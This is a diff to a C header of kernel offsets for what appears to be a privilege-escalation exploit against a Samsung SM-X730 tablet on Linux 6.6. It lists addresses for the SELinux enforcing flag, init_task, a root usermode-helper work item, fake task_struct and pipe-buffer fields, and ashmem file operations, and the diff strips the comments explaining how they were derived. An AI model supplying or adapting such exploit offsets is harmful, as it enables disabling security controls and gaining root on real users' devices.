@@ -1,17 +1,6 @@
 #ifndef OFFSET_H
 #define OFFSET_H
 
-/* SM-X730 Tab S11 WiFi - X730XXS7BZG3
- * Board: gts11wifi, MTK Dimensity 9400+
- * Fingerprint: samsung/gts11wifieea/gts11wifi:16/BP4A.251205.006/X730XXS7BZG3_OXM7BZG3:user/release-keys
- * Kernel: 6.6.102-android15-8-abogkiX730XXS7BZG3-4k
- * Base: ffffffc080000000 (from vmlinux-to-elf)
- * Trace ID: 109 (device)
- * Worker caller: 0x146ab8 (from worker_thread bl schedule -> next insn)
- * BTF: [0x18baa4c, 0x1eea4ee) 6.4MB - Image decompressed 37.5MiB
- * LK: lk-verified.img raw, 0x40000000 le32=180 le64=45, 0x80000000 147/60 -> assume 0x40000000
- */
-
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define BUILD_VARIANT_LABEL "gts11wifi-X730XXS7BZG3-app-physical-p0-oracle"
 #define APP_PHYS_P0_ORACLE 1
@@ -25,7 +14,6 @@
 
 #define KIMAGE_TEXT_BASE 0xffffffc080000000ULL
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
-/* MTK - from LK counts 0x40000000 most plausible. SBOOT not present on Tab S11, use LK */
 #define P0_PHYS_OFFSET 0x40000000ULL
 #define P0_KERNEL_PHYS_LOAD 0x40000000ULL
 #define SKB_DATA_DELTA (-0xe80LL)
@@ -76,7 +64,7 @@
 #define DIRECT_MAP_END 0xffffff9000000000ULL
 #define VMEMMAP_START 0xfffffffe00000000ULL
 
-/* Derived from vmlinux.nm - SM-X730 X730XXS7BZG3 */
+/* Made from vmlinux.nm - SM-X730 X730XXS7BZG3 */
 #define ASHMEM_MISC_FOPS_OFF 0x024fc870ULL /* ashmem_misc 0x024fc860 + 0x10 */
 #define ASHMEM_FOPS_OFF 0x013d4620ULL
 #define ASHMEM_IOCTL_OFF 0x003b83e8ULL
@@ -91,7 +79,7 @@
 #define NOOP_LLSEEK_OFF 0x010bd020ULL
 #define INIT_TASK_OFF 0x0238e340ULL
 #define ROOT_TASK_GROUP_OFF 0x0259cd80ULL
-#define SELINUX_ENFORCING_OFF 0x025dcfb0ULL /* selinux_state.enforcing at offset 0 from BTF */
+#define SELINUX_ENFORCING_OFF 0x025dcfb0ULL
 #define KMALLOC_CACHES_OFF 0x017d7670ULL
 #define ANON_PIPE_BUF_OPS_OFF 0x0123bb08ULL
 
@@ -120,11 +108,10 @@
 #define ROOT_UMH_WORK_OFF 0x6000
 #define ROOT_UMH_DATA_OFF 0x6200
 
-#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x017594e7ULL /* from strings -a -t x Image | grep nfnetlink_log */
-#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x02382278ULL /* nfulnl_logger */
+#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x017594e7ULL 
+#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x02382278ULL 
 #define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
-/* TODO: random_table boot_id data ptr - need to find via Image scan, using psq value as placeholder */
-#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x024b93b0ULL /* random_table 0x024b92a8 + 0x18? data field at +8, second entry? TO BE VERIFIED */
+#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x024b93b0ULL 
 #define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
 #define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
 #define SLIDE_SYSCTL_BOOTID_OFF 0x026c2238ULL
@@ -154,7 +141,6 @@
 #define FAKE_WAITER_WAKE_STATE_OFF 0x60
 #define FAKE_WAITER_WW_CTX_OFF 0x68
 
-/* task_struct offsets - from psq abogki BTF (should be same for 6.6 abogki), TO BE VERIFIED via BTF raw */
 #define FAKE_TASK_USAGE_OFF 0x40
 #define FAKE_TASK_PRIO_OFF 0x84
 #define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
@@ -185,12 +171,11 @@
 #define WORK_FUNC_OFF 0x18
 #define STRUCT_PAGE_SIZE 0x40
 #define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
-#define STRUCT_SLAB_CACHE_OFF 0x08 /* from psq - was 0x18 for 6.1, 0x08 for 6.6 abogki */
+#define STRUCT_SLAB_CACHE_OFF 0x08 
 #define STRUCT_PAGE_TYPE_OFF 0x30
 #define PIPE_BUFFER_SLOTS 32
 #define PIPE_BUF_FLAG_CAN_MERGE 0x10
 
-/* file_operations from BTF raw for 6.6.102 */
 #define FOPS_OWNER_OFF 0x00
 #define FOPS_LLSEEK_OFF 0x08
 #define FOPS_READ_OFF 0x10
